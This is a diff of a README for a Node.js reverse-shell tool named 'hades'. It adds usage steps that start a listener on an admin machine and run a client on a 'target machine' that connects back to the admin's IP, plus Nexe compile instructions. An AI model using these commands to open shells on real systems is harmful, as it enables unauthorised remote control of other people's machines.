@@ -10,7 +10,13 @@ Disclaimer
 - This reverse shell is for academic purposes, the use of this software is your responsibility.
 - This software is still in development, not all the features are implemented yet.
 
-To use this program, 
+Use with Node.js
+1) Run `npm install`
+2) Run `node src/main.js -a [port to listen on]` on the main machine.
+3) Run `node src/main.js -c [admin's port] [admin's ip]` on a target machine.
+4) Done !
+
+Use a compiled version 
 1) Garb a compiled version of the program.
 2) Run `hades -a [port to listen on]` on the main machine.
 3) Run `hades -c [admin's port] [admin's ip]` on a target machine.
@@ -19,12 +25,13 @@ To use this program,
 ## Compile using Nexe
 To compile from source, you will need to follow the instructions listed below.
 
-1) [Transpile](https://code.visualstudio.com/docs/typescript/typescript-compiling) all `.ts` files into `.js`.
-2) Install [Nexe](https://github.com/nexe/nexe).
-3) Execute `nexe src/main.js -o bin/hades -t "linux-x64-14.15.3" -r "src/**.js"`.
-4) Change `linux-x64` with the os you are using following by the [architecture](https://linuxconfig.org/what-is-my-architecture-is-my-cpu-64-bit-or-32-bit#:~:text=The%20best%20way%20to%20quickly,default%20on%20all%20Linux%20distros.) of your CPU.
+1) Run `npm install`
+2) [Transpile](https://code.visualstudio.com/docs/typescript/typescript-compiling) all `.ts` files into `.js`.
+3) Install [Nexe](https://github.com/nexe/nexe).
+4) Execute `nexe src/main.js -o bin/hades -t "linux-x64-14.15.3" -r "src/**.js"`.
+5) Change `linux-x64` with the os you are using following by the [architecture](https://linuxconfig.org/what-is-my-architecture-is-my-cpu-64-bit-or-32-bit#:~:text=The%20best%20way%20to%20quickly,default%20on%20all%20Linux%20distros.) of your CPU.
 
-Note that the program is already compiled in the `./bin` directory.
+Note that the program is already compiled in the `bin` directory.
 
 ## Libs
 Here is the list of used libraries, you can download all of them using `npm install`.
